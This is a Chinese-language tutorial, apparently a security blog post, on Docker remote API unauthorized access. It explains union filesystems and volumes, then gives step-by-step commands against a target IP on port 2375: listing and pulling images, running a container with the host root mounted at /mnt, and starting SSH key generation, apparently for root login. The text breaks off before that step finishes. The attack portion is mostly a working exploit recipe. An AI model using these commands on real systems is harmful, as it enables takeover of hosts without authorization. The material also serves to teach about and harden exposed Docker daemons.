前言

drops上提到的需要安装swarm组件，其实不需要这个组件本身docker就有提供使用remote api的功能，开放到公网还需要开放iptables，所有跟elasticsearch一样都是因为属于受限制的功能被外部访问导致的问题。

docker daemon -H unix:///var/run/docker.sock -H 0.0.0.0:2375



Docker Volumes 与 union 文件系统 


出问题的点就是volumes可外部挂载宿主文件的目录。

union文件系统


Docker镜像是由多个文件系统（只读层）叠加而成。


当我们启动一个容器的时候，Docker会加载只读镜像层并在其上添加一个读写层。如果运行中的容器修改了现有的一个已经存在的文件，那该文件将会从读写层下面的只读层复制到读写层，该文件的只读版本仍然存在，只是已经被读写层中该文件的副本所隐藏。


当删除Docker容器，并通过该镜像重新启动时，之前的更改将会丢失。在Docker中，只读层及在顶部的读写层的组合被称为Union File System（联合文件系统）。


Docker Volumes


Volume就是目录或者文件，它可以绕过默认的联合文件系统，而以正常的文件或者目录的形式存在于宿主机上。其目的就算是为了能够保存（持久化）数据以及共享容器间的数据。



Docker remote API 


Docker Remote API是一个取代远程命令行界面（rcli）的REST API。



Docker未授权访问利用过程 


docker的默认端口为2375，在nmap中该端口就被识别成docker服务。前提条件为开放docker端口，系统存在ssh服务。

-H为连接目标主机docker服务

→  docker -H tcp://123.123.123.123:2375 

查看以有镜像列表

→  docker -H tcp://123.123.123.123:2375 images 


如果不存在镜像，可主动pull一个，其中默认存在的镜像中busybox体积最小，这里拿ubuntu举例。

→  docker -H tcp://123.123.123.123:2375 pull ubuntu 

运行容器并挂载系统根目录（/）。该命令将宿主根目录（/）挂载到容器中/mnt目录下，所有操作在mnt目录下进行。

→  docker -H tcp://123.123.123.123:2375 run -v /:/mnt -ti ubuntu /bin/bash 


生成SSH免密码登录key，得到id_rsa.pub文件。

ssh-keygen –t rsa –C "root"

文件内容大致如下：
